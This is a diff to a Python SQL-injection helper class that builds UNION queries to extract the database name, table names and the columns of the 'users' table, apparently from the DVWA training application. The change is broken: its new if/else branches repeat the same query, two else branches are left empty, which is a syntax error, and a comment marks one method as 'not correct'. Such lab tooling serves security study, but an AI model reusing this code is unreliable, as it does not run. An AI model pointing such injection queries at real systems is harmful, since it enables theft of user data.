@@ -139,19 +139,29 @@ class Union:
 			self.mysql = False
 
 	def get_database_name(self):
-		self.exec_union("DATABASE()", "")
+		if self.mysql:
+			self.exec_union("DATABASE()", "")
+		else:
+			self.exec_union("DATABASE()", "")
 
 	def get_table_names(self):
-		contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
+		if self.mysql:
+			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
+		else:
+			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
 		self.exec_union("table_name", contents)
 
 	def get_column_names(self):
-		contents = " FROM information_schema.columns WHERE table_name = 'users'"
+		if self.mysql:
+			contents = " FROM information_schema.columns WHERE table_name = 'users'"
+		else:
 		self.exec_union("column_name", contents)
 
 	def get_all_data(self):
 		# not correct
-		contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
+		if self.mysql:
+			contents = " FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa'"
+		else:
 		self.exec_union("table_name", contents)
 
 	def union(self):
